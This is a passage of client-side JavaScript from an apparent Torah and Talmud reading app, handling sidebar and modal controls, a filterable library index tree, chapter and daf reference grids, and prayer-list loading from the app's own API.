                    void toggleShulLibrarySidebar();
                } else {
                    toggleLeftSidebar();
                }
            });
        }

        if (readerCommentaryTopBarBtn) {
            readerCommentaryTopBarBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                if (isCommentaryEligiblePrimaryText()
                    && (selectionCommentaryState.mode === 'reading' || !commentaryAvailableForCurrentSelection)) {
                    // No passage selected: list the commentary on the verse
                    // being read (loaded ahead of time) and follow the reader.
                    void startReadingCommentary();
                } else if (!commentaryAvailableForCurrentSelection) {
                    resetSelectionInsights();
                    setCommentaryAvailability(true);
                    showSelectionInsights();
                }
                if (isMobileViewport()) {
                    openMobilePanel('right');
                } else {
                    // Unconditional (not just when currently hidden): this is
                    // what actually re-runs applySidebarVisibility() so the
                    // commentaryAvailableForCurrentSelection flip above takes
                    // effect and the column renders -- setting the state var
                    // alone doesn't touch the DOM.
                    setSidebarVisibility('right', true);
                }
            });
        }

        if (closeChapterGridModalBtn) {
            closeChapterGridModalBtn.addEventListener('click', () => {
                closeChapterGrid();
            });
        }

        if (chapterGridItems) {
            chapterGridItems.addEventListener('click', (e) => {
                const button = e.target.closest('.chapter-grid-item');
                if (!button) return;
                const targetRef = String(button.dataset.ref || '').trim();
                if (!targetRef) return;
                closeChapterGrid();
                void readText(targetRef, { skipNavigationGrid: true });
            });
        }

        if (chapterGridParashaStrip) {
            chapterGridParashaStrip.addEventListener('click', (e) => {
                const button = e.target.closest('.chapter-grid-parasha-link');
                if (!button) return;
                const targetRef = String(button.dataset.ref || '').trim();
                if (!targetRef) return;
                closeChapterGrid();
                void readText(targetRef, { skipNavigationGrid: true });
            });
        }

        if (chapterGridModal) {
            chapterGridModal.addEventListener('click', (e) => {
                if (e.target === chapterGridModal) {
                    closeChapterGrid();
                }
            });
        }

        if (brandHomeBtn) {
            brandHomeBtn.addEventListener('dblclick', (e) => {
                if (e.shiftKey) {
                    e.preventDefault();
                    openDevtoolsInspector();
                }
            });
        }

        if (closeDevtoolsInspectorBtn) {
            closeDevtoolsInspectorBtn.addEventListener('click', closeDevtoolsInspector);
        }

        const closeLibraryCategoryBtn = document.getElementById('closeLibraryCategoryBtn');
        if (closeLibraryCategoryBtn) {
            closeLibraryCategoryBtn.addEventListener('click', closeLibraryCategory);
        }
        const libraryCategoryModalEl = document.getElementById('libraryCategoryModal');
        if (libraryCategoryModalEl) {
            libraryCategoryModalEl.addEventListener('click', e => {
                if (e.target === libraryCategoryModalEl) closeLibraryCategory();
            });
        }

        const privacyDataModalEl = document.getElementById('privacyDataModal');
        if (privacyDataModalEl) {
            privacyDataModalEl.addEventListener('click', e => {
                if (e.target === privacyDataModalEl) closePrivacyDataModal();
            });
        }
        if (exportCitationBtn) {
            exportCitationBtn.addEventListener('click', () => {
                void exportCurrentCitation();
            });
        }
        if (personalShelf) {
            personalShelf.addEventListener('click', async (e) => {
                const clearBtn = e.target.closest('[data-action="clear-recents"]');
                if (clearBtn) {
                    const shelf = getShelfData();
                    shelf.recent = [];
                    saveShelfData(shelf);
                    renderPersonalShelf();
                    return;
                }

                const itemBtn = e.target.closest('.shelf-open');
                if (!itemBtn) return;
                const type = itemBtn.dataset.type;
                const value = itemBtn.dataset.value;
                const label = itemBtn.dataset.label;
                await openShelfItem(type, value, label);
            });

            personalShelf.addEventListener('contextmenu', (e) => {
                const itemBtn = e.target.closest('.shelf-open');
                if (!itemBtn) return;

                const bucket = String(itemBtn.dataset.shelfBucket || '').trim();
                if (bucket !== 'recent') {
                    return;
                }

                const type = itemBtn.dataset.type;
                const value = itemBtn.dataset.value;
                if (!type || !value) return;

                e.preventDefault();
                removeRecentShelfItem(type, value);
            });
        }

        // ─── FULL LIBRARY INDEX (TOPICS + TEXTS) ───────────────────────────
        let libraryIndexData = null;

        function getLibraryNodeChildren(node) {
            if (!node || typeof node !== 'object') return [];
            if (Array.isArray(node.contents) && node.contents.length) return node.contents;
            if (Array.isArray(node.children) && node.children.length) return node.children;
            return [];
        }

        function getLibraryNodeLabels(node) {
            if (!node || typeof node !== 'object') {
                return { en: '', he: '', display: '' };
            }
            const en = String(node.title || node.category || node.key || '').trim();
            const he = String(node.heTitle || node.heCategory || '').trim();
            const fallbackHe = isHebrewMode()
                ? (
                    getHebrewStaticLabel(withHebrewBookName(en))
                    || getHebrewStaticLabel(en)
                    || localizeLooseHebrewPhrase(withHebrewBookName(en))
                    || localizeLooseHebrewPhrase(en)
                )
                : '';
            return {
                en,
                he,
                display: isHebrewMode() ? (he || fallbackHe || en) : (en || he),
            };
        }

        const TANAKH_EN_HE_LABELS = {
            'Genesis': 'Bereishit',
            'Exodus': 'Shemot',
            'Leviticus': 'Vayikra',
            'Numbers': 'Bamidbar',
            'Deuteronomy': 'Devarim',
            'Joshua': 'Yehoshua',
            'Judges': 'Shoftim',
            'I Samuel': 'Shmuel I',
            'II Samuel': 'Shmuel II',
            'I Kings': 'Melakhim I',
            'II Kings': 'Melakhim II',
            'Isaiah': 'Yeshayahu',
            'Jeremiah': 'Yirmiyahu',
            'Ezekiel': 'Yechezkel',
            'Hosea': 'Hoshea',
            'Joel': 'Yoel',
            'Obadiah': 'Ovadiah',
            'Jonah': 'Yonah',
            'Nahum': 'Nachum',
            'Habakkuk': 'Chavakuk',
            'Zephaniah': 'Tzefaniah',
            'Haggai': 'Chaggai',
            'Malachi': 'Malakhi',
            'Psalms': 'Tehillim',
            'Proverbs': 'Mishlei',
            'Song of Songs': 'Shir HaShirim',
            'Ecclesiastes': 'Kohelet',
            'Lamentations': 'Eicha',
        };

        function withHebrewBookName(label) {
            const base = String(label || '').trim();
            if (!base || hasParenthetical(base)) return base;
            const suffix = TANAKH_EN_HE_LABELS[base];
            if (!suffix) return base;
            return `${base} (${suffix})`;
        }

        function normalizeLibraryLookupKey(value) {
            return String(value || '').toLowerCase().replace(/[^a-z0-9]/g, '');
        }

        function shouldHideLibraryNode(node) {
            if (!node || typeof node !== 'object') return true;
            return Boolean(node.hidden);
        }

        function resolveLibraryNodeRef(node) {
            if (!node || typeof node !== 'object') return '';
            const directRef = String(node.firstSectionRef || node.ref || '').trim();
            if (directRef) return directRef;

            const title = String(node.title || '').trim();
            if (!title) return '';
            return title;
        }

        function normalizeLibraryFilterValue(value) {
            return String(value || '').toLowerCase().replace(/\s+/g, ' ').trim();
        }

        function libraryNodeMatchesFilter(node, filterValue) {
            if (!filterValue) return true;

            const labels = getLibraryNodeLabels(node);
            const searchable = `${labels.en} ${labels.he}`.toLowerCase();
            if (searchable.includes(filterValue)) {
                return true;
            }

            return getLibraryNodeChildren(node).some((child) => libraryNodeMatchesFilter(child, filterValue));
        }

        function buildLibraryIndexMarkup(nodes, filterValue = '', depth = 0, maxDepth = 5) {
            if (!Array.isArray(nodes) || depth > maxDepth) return '';

            return nodes.map((node) => {
                if (shouldHideLibraryNode(node)) {
                    return '';
                }

                if (!libraryNodeMatchesFilter(node, filterValue)) {
                    return '';
                }

                const labels = getLibraryNodeLabels(node);
                const children = getLibraryNodeChildren(node);
                const hasChildren = children.length > 0;

                if (hasChildren) {
                    const childrenMarkup = buildLibraryIndexMarkup(children, filterValue, depth + 1, maxDepth);
                    if (!childrenMarkup) return '';

                    const summaryClass = depth === 0
                        ? 'font-semibold text-slate-700 hover:text-navy'
                        : 'text-slate-600 hover:text-navy';

                    return `
                        <details class="library-tree-node group ${depth === 0 ? 'mb-1' : ''}">
                            <summary class="library-tree-summary cursor-pointer list-none ${summaryClass}">
                                ${escapeHtml(labels.display || labels.en || labels.he || t('Category', 'קטגוריה'))}
                            </summary>
                            <div class="library-tree-children mt-1 space-y-1">${childrenMarkup}</div>
                        </details>
                    `;
                }

                const ref = resolveLibraryNodeRef(node);
                if (!ref) return '';

                const encodedRef = encodeURIComponent(ref);
                const encodedTitle = encodeURIComponent(labels.en || labels.display || ref);
                const textClass = depth <= 1 ? 'text-slate-700' : 'text-slate-600';
                const alignClass = isHebrewMode() ? 'text-end' : 'text-start';
                const leafDisplay = isHebrewMode()
                    ? (labels.display || labels.en || labels.he || ref)
                    : withHebrewBookName(labels.display || labels.en || labels.he || ref);

                return `
                    <button type="button"
                        class="library-node-open block w-full ${alignClass} px-2 py-1 rounded-sm hover:bg-slate-100 transition text-sm ${textClass}"
                        data-ref="${encodedRef}"
                        data-title="${encodedTitle}">
                        ${escapeHtml(leafDisplay)}
                    </button>
                `;
            }).join('');
        }

        // The tree is a pure function of (data, filter, language), so each
        // region is rebuilt only when one of those three changes -- opening
        // the Texts menu used to rebuild and re-parse both regions every time
        // and collapsed whatever the reader had expanded. The Texts-menu tree
        // (depth 5, ~10k nodes) is also built only when the menu is opened,
        // not at startup while it is hidden.
        let libraryIndexSidebarKey = null;
        let libraryIndexModalKey = null;

        function renderLibraryIndexViews({ modal = false } = {}) {
            if (!libraryIndexData) return;
            const filterValue = normalizeLibraryFilterValue(libraryIndexFilterInput?.value || '');
            const renderKey = `${isHebrewMode() ? 'he' : 'en'}|${filterValue}`;
            const empty = `<p class="text-xs italic text-slate-400">${t('No matching topics found.', 'לא נמצאו נושאים תואמים.')}</p>`;

            if (libraryIndexSidebar && renderKey !== libraryIndexSidebarKey) {
                libraryIndexSidebarKey = renderKey;
                libraryIndexSidebar.innerHTML = buildLibraryIndexMarkup(libraryIndexData, filterValue, 0, 3) || empty;
            }
            libraryIndexSidebar?.setAttribute('aria-busy', 'false');

            if (modal && libraryIndexModal) {
                if (renderKey !== libraryIndexModalKey) {
                    libraryIndexModalKey = renderKey;
                    libraryIndexModal.innerHTML = buildLibraryIndexMarkup(libraryIndexData, filterValue, 0, 5) || empty;
                }
                libraryIndexModal.setAttribute('aria-busy', 'false');
            }
        }

        function textsMenuIsOpen() {
            return document.getElementById('textsMenuModal')?.classList.contains('flex') === true;
        }

        async function loadLibraryIndexViews(attempt = 0, { modal = false } = {}) {
            if (!libraryIndexData) {
                try {
                    const response = await fetch('/api/library/index');
                    if (!response.ok) throw new Error('Failed to fetch library index');
                    const data = await response.json();
                    libraryIndexData = [];
                    if (Array.isArray(data)) libraryIndexData = data;
                    else if (Array.isArray(data?.contents)) libraryIndexData = data.contents;
                } catch {
                    libraryIndexSidebarKey = null;
                    libraryIndexModalKey = null;
                    failListRegions(modal ? [libraryIndexSidebar, libraryIndexModal] : [libraryIndexSidebar],
                        t("Couldn't load the library index. Check your connection.", 'לא ניתן לטעון את אינדקס הספרייה. בדקו את החיבור.'),
                        (next) => loadLibraryIndexViews(next, { modal }), attempt);
                    return;
                }
            }
            renderLibraryIndexViews({ modal: modal || textsMenuIsOpen() });
        }

        if (libraryIndexFilterInput) {
            // One rebuild per pause in typing, not one per keystroke.
            let libraryFilterTimer = 0;
            libraryIndexFilterInput.addEventListener('input', () => {
                clearTimeout(libraryFilterTimer);
                libraryFilterTimer = setTimeout(() => renderLibraryIndexViews({ modal: textsMenuIsOpen() }), 120);
            });
        }

        if (libraryIndexFilterClear) {
            libraryIndexFilterClear.addEventListener('click', () => {
                if (libraryIndexFilterInput) {
                    libraryIndexFilterInput.value = '';
                    renderLibraryIndexViews({ modal: textsMenuIsOpen() });
                }
            });
        }

        function setActiveLibraryNode(activeButton) {
            const activeRef = String(activeButton?.dataset?.ref || '').trim();
            const activeTitle = String(activeButton?.dataset?.title || '').trim();

            document.querySelectorAll('.library-node-open.library-node-active').forEach((node) => {
                node.classList.remove('library-node-active');
            });

            if (!activeRef && !activeTitle) return;

            document.querySelectorAll('.library-node-open').forEach((node) => {
                const nodeRef = String(node.dataset.ref || '').trim();
                const nodeTitle = String(node.dataset.title || '').trim();
                const matches = (activeRef && nodeRef === activeRef) || (activeTitle && nodeTitle === activeTitle);
                if (matches) {
                    node.classList.add('library-node-active');
                }
            });
        }

        function bindLibraryIndexClicks(container) {
            if (!container) return;
            container.addEventListener('click', async (e) => {
                const button = e.target.closest('.library-node-open');
                if (!button) return;

                setActiveLibraryNode(button);

                const ref = decodeURIComponent(button.dataset.ref || '');
                const title = decodeURIComponent(button.dataset.title || '');
                if (!ref && !title) return;
                closeTextsMenu();

                const candidates = [ref, title].filter(Boolean);
                for (const candidate of candidates) {
                    try {
                        const target = await resolveSearchTarget(candidate);
                        if (target && await openSearchTarget(target, candidate)) {
                            return;
                        }
                    } catch {
                        // Fallback to direct read below.
                    }
                }

                await readText(ref || title);
            });
        }

        bindLibraryIndexClicks(libraryIndexSidebar);
        bindLibraryIndexClicks(libraryIndexModal);

        // ─── TEXTS MENU FUNCTIONS ───────────────────────────────────────────
        function openTextsMenu() {
            closeMobilePanels();
            closeReaderSettingsPanel();
            const modal = document.getElementById('textsMenuModal');
            modal.classList.add('flex');
            presentEl(modal, modalMotion(modal));
            renderSiddurMenus();
            void loadCommunitiesMenu();
            void loadLibraryIndexViews(0, { modal: true });
        }

        function closeTextsMenu() {
            const modal = document.getElementById('textsMenuModal');
            dismissEl(modal, { ...modalMotion(modal), onHidden: () => modal.classList.remove('flex') });
        }

        function closeChapterGrid() {
            if (!chapterGridModal) return;
            // Exit first; the native close() must wait (closing a <dialog> drops it
            // out of the top layer at once). The render code re-sets the grid's
            // layout classes on every open, so clearing them can wait as well.
            dismissEl(chapterGridModal, {
                ...modalMotion(chapterGridModal),
                onHidden: () => {
                    chapterGridModal.classList.remove('flex');
                    chapterGridItems?.classList.remove('chapter-grid-items-prayer', 'chapter-grid-items-sectioned');
                    if (chapterGridModal.open) chapterGridModal.close();
                },
            });
        }

        // <dialog> closes on Escape natively; keep that path routed through
        // closeChapterGrid() (not the raw native close) so the class cleanup
        // above always runs -- this modal previously had no Escape-to-close
        // at all, so this keeps that same single code path as the only way
        // it closes, just adding Escape as a trigger for it.
        chapterGridModal?.addEventListener('cancel', (e) => {
            e.preventDefault();
            closeChapterGrid();
        });

        function _openChapterGridDialog() {
            // Un-hidden before showModal() so focus can move into the dialog; the
            // entrance then replays from its start state within the same task.
            const wasOpen = chapterGridModal.open && !chapterGridModal.classList.contains('is-hiding');
            chapterGridModal.classList.remove('hidden');
            chapterGridModal.classList.add('flex');
            if (!chapterGridModal.open) chapterGridModal.showModal();
            if (!wasOpen) presentEl(chapterGridModal, { ...modalMotion(chapterGridModal), replay: true });
        }

        function renderChapterGridParashaStrip(bookName) {
            if (!chapterGridParashaStrip) return;

            const normalizedBook = normalizeChapterGridBookName(bookName);
            const parashaEntries = Array.isArray(TORAH_PARASHA_BY_BOOK[normalizedBook])
                ? TORAH_PARASHA_BY_BOOK[normalizedBook]
                : [];

            if (!parashaEntries.length) {
                chapterGridParashaStrip.classList.add('hidden');
                chapterGridParashaStrip.innerHTML = '';
                return;
            }

            const chips = parashaEntries
                .map((entry) => {
                    const chapterNum = Number(entry?.chapter || 0);
                    if (!Number.isFinite(chapterNum) || chapterNum < 1) return '';

                    const ref = `${normalizedBook} ${chapterNum}`;
                    const nameEn = String(entry?.name || '').trim() || `${t('Chapter', 'פרק')} ${chapterNum}`;
                    const nameHe = PARASHA_HE_MAP[nameEn] || nameEn;
                    const label = isHebrewMode() ? nameHe : nameEn;
                    // Where the portion actually starts ("4:21" / "ד׳:כ״א").
                    const startLang = isHebrewMode() ? 'he' : 'en';
                    const startLabel = hebrewRef
                        ? hebrewRef.parashaStartLabel(entry, startLang)
                        : String(chapterNum);
                    const chapterLabel = isHebrewMode() ? `מתחילה ב${startLabel}` : `Starts at ${startLabel}`;
                    const compactChapterLabel = startLabel;

                    return `
                        <button type="button"
                            class="chapter-grid-parasha-link"
                            data-ref="${escapeHtml(ref)}"
                            title="${escapeHtml(chapterLabel)}">
                            <span class="chapter-grid-parasha-name">${escapeHtml(label)}</span>
                            <span class="chapter-grid-parasha-meta">${escapeHtml(compactChapterLabel)}</span>
                        </button>
                    `;
                })
                .filter(Boolean)
                .join('');

            if (!chips) {
                chapterGridParashaStrip.classList.add('hidden');
                chapterGridParashaStrip.innerHTML = '';
                return;
            }

            chapterGridParashaStrip.innerHTML = chips;
            chapterGridParashaStrip.classList.remove('hidden');
        }

        function openChapterGrid(book, chapterCount) {
            if (!chapterGridModal || !chapterGridItems) return;

            const safeBook = String(book || '').trim();
            const safeCount = Number(chapterCount || 0);
            if (!safeBook || !Number.isFinite(safeCount) || safeCount < 1) return;

            if (chapterGridTitle) {
                chapterGridTitle.textContent = isHebrewMode()
                    ? `בחר פרק: ${safeBook}`
                    : `${safeBook} Sections`;
            }
            if (chapterGridSubtitle) {
                chapterGridSubtitle.textContent = isHebrewMode()
                    ? 'בחר פרק לפתיחה מהירה'
                    : 'Select a chapter to open';
            }

            renderChapterGridParashaStrip(safeBook);

            const items = Array.from({ length: safeCount }, (_, idx) => idx + 1)
                .map((chapterNum) => {
                    const ref = `${safeBook} ${chapterNum}`;
                    return `
                        <button type="button"
                            class="chapter-grid-item"
                            data-ref="${escapeHtml(ref)}">
                            <span class="chapter-grid-item-number">${chapterNum}</span>
                            <span class="chapter-grid-item-label">${escapeHtml(isHebrewMode() ? 'פרק' : 'Chapter')}</span>
                        </button>
                    `;
                })
                .join('');

            chapterGridItems.innerHTML = items;
            _openChapterGridDialog();
        }

        function getReferenceGridItemLabel(indexTitle, ref, index) {
            const safeRef = String(ref || '').replace(/\s+/g, ' ').trim();
            if (!safeRef) {
                return `${isHebrewMode() ? 'קטע' : 'Section'} ${index + 1}`;
            }

            const safeTitle = String(indexTitle || '').replace(/\s+/g, ' ').trim();
            if (!safeTitle) return safeRef;

            const lowerRef = safeRef.toLowerCase();
            const lowerTitle = safeTitle.toLowerCase();

            const localizeDafInLabel = (label) => {
                if (!isHebrewMode()) return label;
                return String(label || '').replace(/\b(\d+)([ab])(?::(\d+))?\b/gi, (_, page, side, line) => {
                    const lineSuffix = line ? `:${line}` : '';
                    return localizeDafToken(`${page}${side}${lineSuffix}`);
                });
            };

            if (!lowerRef.startsWith(lowerTitle)) {
                return localizeDafInLabel(safeRef);
            }

            const trimmed = safeRef.slice(safeTitle.length).replace(/^,\s*/, '').trim();
            return localizeDafInLabel(trimmed || safeRef);
        }

        function isTalmudReferenceLabel(ref) {
            return /\b\d+[ab](?::\d+)?\b/i.test(String(ref || ''));
        }

        function isPrayerReferenceGridTitle(indexTitle, refs = []) {
            const title = String(indexTitle || '').toLowerCase();
            const prayerTitleHit = /(siddur|machzor|haggadah|selichot|kinnot|tefill|prayer)/i.test(title);
            if (prayerTitleHit) return true;
            if (!Array.isArray(refs) || !refs.length) return false;
            return refs.some((ref) => /(siddur|machzor|haggadah|selichot|kinnot|tefill|prayer)/i.test(String(ref || '')));
        }

        function applyPrayerGridSizeClass() {
            if (!chapterGridItems) return;
            if (!chapterGridItems.classList.contains('chapter-grid-items-prayer')) return;
            // Prayer selection buttons stay medium-sized by design.
        }

        /** Convert daf string "2a"/"13b" to a numeric key for range comparisons. */
        function _dafToKey(daf) {
            const m = /^(\d+)([ab])$/i.exec(String(daf || '').trim());
            if (!m) return -1;
            return Number.parseInt(m[1], 10) * 2 + (m[2].toLowerCase() === 'a' ? 0 : 1);
        }

        /** Build a chapter-section lookup from API sections data. */
        function _buildSectionLookup(sections) {
            // sections: [{label, fromDaf, toDaf}, ...]
            return sections
                .filter((s) => s?.fromDaf && s.toDaf)
                .map((s) => ({
                    label: String(s.label || '').trim(),
                    fromKey: _dafToKey(s.fromDaf),
                    toKey: _dafToKey(s.toDaf),
                    fromDaf: String(s.fromDaf).toLowerCase(),
                    toDaf: String(s.toDaf).toLowerCase(),
                }))
                .filter((s) => s.fromKey >= 0 && s.toKey >= 0);
        }

        /** Return the section label for a given daf key, or '' if not found. */
        function _getSectionForDaf(dafKey, lookup, isHebrew) {
            if (!lookup?.length) return '';
            const hit = lookup.find((s) => dafKey >= s.fromKey && dafKey <= s.toKey);
            if (!hit) return '';
            const fromToken = isHebrew ? localizeDafToken(hit.fromDaf) : hit.fromDaf;
            const toToken = isHebrew ? localizeDafToken(hit.toDaf) : hit.toDaf;
            const range = `${fromToken}–${toToken}`;
            const sectionLabel = isHebrew ? localizeTalmudSectionLabel(hit.label) : hit.label;
            return `${sectionLabel} (${range})`;
        }

        /** Extract the leading siman/section number from a ref remainder, or -1. */
        function _sectionKeyFromRef(remainder) {
            const m = /^(\d+)/.exec(String(remainder || '').trim());
            return m ? Number.parseInt(m[1], 10) : -1;
        }

        /** Build a section lookup for numeric-siman works (Shulchan Arukh, Mishneh
         *  Torah, etc. — via alts.Topic) from {label, heLabel, fromSection, toSection}. */
        function _buildNumericSectionLookup(sections) {
            return sections
                .filter((s) => s && Number.isFinite(s.fromSection) && Number.isFinite(s.toSection))
                .map((s) => ({
                    label: String(s.label || '').trim(),
                    heLabel: String(s.heLabel || s.label || '').trim(),
                    fromKey: s.fromSection,
                    toKey: s.toSection,
                }))
                .filter((s) => s.fromKey >= 0 && s.toKey >= 0);
        }

        /** Return the section label for a given siman number, or '' if not found. */
        function _getSectionForNumber(numKey, lookup, isHebrew) {
            if (!lookup?.length || numKey < 0) return '';
            const hit = lookup.find((s) => numKey >= s.fromKey && numKey <= s.toKey);
            if (!hit) return '';
            const label = isHebrew ? (hit.heLabel || hit.label) : hit.label;
            return `${label} (${hit.fromKey}–${hit.toKey})`;
        }

        function openReferenceGrid(indexTitle, refs, sections) {
            if (!chapterGridModal || !chapterGridItems) return;

            const safeTitle = String(indexTitle || '').replace(/\s+/g, ' ').trim();
            const normalizedRefs = Array.isArray(refs)
                ? refs.map((ref) => String(ref || '').replace(/\s+/g, ' ').trim()).filter(Boolean)
                : [];
            // A large flat (ungrouped) list is a real UX regression — only allow the
            // full count through when section-grouping data lets it render in groups.
            const hasSections = Array.isArray(sections) && sections.length > 0;
            const visibleRefs = normalizedRefs.slice(0, hasSections ? 800 : 200);
            const talmudMode = visibleRefs.some((ref) => isTalmudReferenceLabel(ref));
            const prayerMode = isPrayerReferenceGridTitle(safeTitle, visibleRefs);
            // Sections come in two shapes depending on the work: Talmud daf ranges
            // ({fromDaf,toDaf}, from alts.Chapters) or numeric siman ranges
            // ({fromSection,toSection}, from alts.Topic — Shulchan Arukh, Mishneh
            // Torah, etc). Grouping is enabled whenever either is present, not just
            // for Talmud — daf/numeric parsing stays separate below via talmudMode.
            let sectionLookup = [];
            if (hasSections) sectionLookup = talmudMode ? _buildSectionLookup(sections) : _buildNumericSectionLookup(sections);

            if (!safeTitle || normalizedRefs.length < 2) {
                return;
            }

            setReferenceGridHeading(safeTitle, talmudMode);

            if (chapterGridParashaStrip) {
                chapterGridParashaStrip.classList.add('hidden');
                chapterGridParashaStrip.innerHTML = '';
            }

            chapterGridItems.classList.toggle('chapter-grid-items-prayer', prayerMode);
            chapterGridItems.classList.toggle('chapter-grid-items-sectioned', sectionLookup.length > 0);
            applyPrayerGridSizeClass();

            chapterGridItems.innerHTML = sectionLookup.length
                ? referenceGridSectionedMarkup(safeTitle, visibleRefs, talmudMode, sectionLookup)
                : referenceGridFlatMarkup(safeTitle, visibleRefs, talmudMode);
            _openChapterGridDialog();
        }

        function setReferenceGridHeading(safeTitle, talmudMode) {
            if (chapterGridTitle) {
                chapterGridTitle.textContent = isHebrewMode()
                    ? `בחר קטע: ${safeTitle}`
                    : `${safeTitle} Sections`;
            }
            if (chapterGridSubtitle) {
                let subtitle;
                if (isHebrewMode()) subtitle = talmudMode ? 'בחר דף או קטע לפתיחה מהירה' : 'בחר קטע לפתיחה מהירה';
                else subtitle = talmudMode ? 'Select a daf or section to open' : 'Select a section to open';
                chapterGridSubtitle.textContent = subtitle;
            }
        }

        // What follows the index title in a ref: "Berakhot 2a:3" -> "2a:3".
        function referenceGridRemainder(safeTitle, targetRef) {
            if (safeTitle && targetRef.toLowerCase().startsWith(safeTitle.toLowerCase())) {
                return targetRef.slice(safeTitle.length).replace(/^[,\s]+/, '').trim();
            }
            return targetRef;
        }

        function dafOfRemainder(remainder) {
            const dafMatch = /^(\d+[ab])/i.exec(remainder);
            return dafMatch ? dafMatch[1].toLowerCase() : '';
        }

        function dafGroupLabel(dafStr) {
            return isHebrewMode() ? `דף ${localizeDafToken(dafStr)}` : `Daf ${dafStr}`;
        }

        function referenceGridItemMarkup(safeTitle, targetRef, idx) {
            const label = getReferenceGridItemLabel(safeTitle, targetRef, idx);
            return `
                <button type="button"
                    class="chapter-grid-item"
                    data-ref="${escapeHtml(targetRef)}"
                    title="${escapeHtml(label)}">
                    <span class="chapter-grid-item-number">${escapeHtml(label)}</span>
                </button>
            `;
        }

        function referenceGridSectionLabel(remainder, talmudMode, sectionLookup) {
            if (talmudMode) {
                const dafStr = dafOfRemainder(remainder);
                const dafKey = _dafToKey(dafStr);
                if (dafKey >= 0) return _getSectionForDaf(dafKey, sectionLookup, isHebrewMode());
                return dafStr ? dafGroupLabel(dafStr) : t('Unsorted', 'ללא מיון');
            }
            const numKey = _sectionKeyFromRef(remainder);
            return _getSectionForNumber(numKey, sectionLookup, isHebrewMode()) || t('Unsorted', 'ללא מיון');
        }

        // Refs grouped under their section headings (daf ranges or siman ranges).
        function referenceGridSectionedMarkup(safeTitle, visibleRefs, talmudMode, sectionLookup) {
            const groups = [];
            let group = null;

            visibleRefs.forEach((targetRef, idx) => {
                const remainder = referenceGridRemainder(safeTitle, targetRef);
                const sectionLabel = referenceGridSectionLabel(remainder, talmudMode, sectionLookup);
                if (!group || group.label !== sectionLabel) {
                    group = { label: sectionLabel, items: [] };
                    groups.push(group);
                }
                group.items.push(referenceGridItemMarkup(safeTitle, targetRef, idx));
            });

            return groups.map((entry) => `
                <section class="chapter-grid-section-block">
                    <div class="chapter-grid-group-label">${escapeHtml(entry.label)}</div>
                    <div class="chapter-grid-section-items">
                        ${entry.items.join('')}
                    </div>
                </section>
            `).join('');
        }

        // Refs in one flat list; Talmud refs get a label whenever the daf changes.
        function referenceGridFlatMarkup(safeTitle, visibleRefs, talmudMode) {
            const items = [];
            let lastGroupLabel = '';

            visibleRefs.forEach((targetRef, idx) => {
                if (talmudMode) {
                    const dafStr = dafOfRemainder(referenceGridRemainder(safeTitle, targetRef));
                    const groupLabel = dafStr ? dafGroupLabel(dafStr) : '';
                    if (groupLabel && groupLabel !== lastGroupLabel) {
                        items.push(`<div class="chapter-grid-group-label">${escapeHtml(groupLabel)}</div>`);
                        lastGroupLabel = groupLabel;
                    }
                }
                items.push(referenceGridItemMarkup(safeTitle, targetRef, idx));
            });

            return items.join('');
        }

        async function fetchIndexLeafRefs(indexTitle) {
            const normalizedTitle = String(indexTitle || '').replace(/\s+/g, ' ').trim();
            if (!normalizedTitle) return [];

            const cacheKey = normalizeLibraryLookupKey(normalizedTitle) || normalizedTitle.toLowerCase();
            if (indexLeafRefCache.has(cacheKey)) {
                return indexLeafRefCache.get(cacheKey);
            }

            try {
                // 800 matches the backend's own raised cap (routes_library.py) — large
                // works like Shulchan Arukh, Orach Chayim (697 simanim) were silently
                // truncated at the old 180/260 limits before section-grouping existed.
                const params = new URLSearchParams({ title: normalizedTitle, max: '800' });
                const resp = await fetch(`/api/library/leaf-refs?${params.toString()}`);
                if (!resp.ok) {
                    indexLeafRefCache.set(cacheKey, []);
                    indexSectionsCache.set(cacheKey, []);
                    return [];
                }

                const payload = await resp.json();
                const refs = Array.isArray(payload?.refs)
                    ? payload.refs.map((ref) => String(ref || '').replace(/\s+/g, ' ').trim()).filter(Boolean)
                    : [];
                const sections = Array.isArray(payload?.sections) ? payload.sections : [];
                indexLeafRefCache.set(cacheKey, refs);
                indexSectionsCache.set(cacheKey, sections);
                return refs;
            } catch {
                indexLeafRefCache.set(cacheKey, []);
                indexSectionsCache.set(cacheKey, []);
                return [];
            }
        }

        async function maybeOpenReferenceGrid(ref) {
            const indexTitle = shouldOpenReferenceGrid(ref);
            if (!indexTitle) return false;

            const leafRefs = await fetchIndexLeafRefs(indexTitle);
            if (!Array.isArray(leafRefs) || leafRefs.length < 2) {
                return false;
            }

            const cacheKey = normalizeLibraryLookupKey(indexTitle) || indexTitle.toLowerCase();
            const sections = indexSectionsCache.get(cacheKey) || [];
            openReferenceGrid(indexTitle, leafRefs, sections);
            return true;
        }

        // `rethrow`: a failed fetch throws (the menu shows Retry) instead of
        // quietly giving [].
        async function ensurePrayerListLoaded({ rethrow = false } = {}) {
            if (Array.isArray(textsCache.prayersList) && textsCache.prayersList.length) {
                return textsCache.prayersList;
            }

            try {
                const response = await fetch('/api/prayers/list');
                if (!response.ok) {
                    throw new Error('prayer list unavailable');
                }
                const prayers = await response.json();
                textsCache.prayersList = Array.isArray(prayers) ? prayers : [];
            } catch (err) {
                textsCache.prayersList = [];
                if (rethrow) throw err;
            }

            return textsCache.prayersList;
        }

        function normalizePrayerList(prayers) {
            if (!Array.isArray(prayers)) return [];
            const seen = new Set();
            const normalized = [];

            prayers.forEach((prayer) => {
                const name = String(prayer?.name || prayer?.title || '').trim();
                if (!name) return;

                const key = normalizeLibraryLookupKey(name) || name.toLowerCase();
                if (seen.has(key)) return;
                seen.add(key);

                normalized.push({
                    name,
                    source: String(prayer?.source || '').trim().toLowerCase(),
                });
            });
            return normalized.sort((a, b) => a.name.localeCompare(b.name, 'en', { sensitivity: 'base' }));
        }

        function getPrayerNavigationContext(prayerName) {
            const entries = normalizePrayerList(textsCache.prayersList || []);
            if (!entries.length) return null;

            const currentKey = normalizeLibraryLookupKey(prayerName);
            const index = entries.findIndex((entry) => normalizeLibraryLookupKey(entry.name) === currentKey);
            if (index < 0) return null;

            return {
                total: entries.length,
                index,
                current: entries[index],
                prev: entries[index - 1] || null,
                next: entries[index + 1] || null,
            };
        }

        function renderPrayerNavigation(prayerName) {
            const context = getPrayerNavigationContext(prayerName);
            if (!context) return '';

            const currentLabel = getPrayerDisplayName(context.current?.name || prayerName);
            const progressLabel = `${context.index + 1}/${context.total}`;

            const prevButton = context.prev
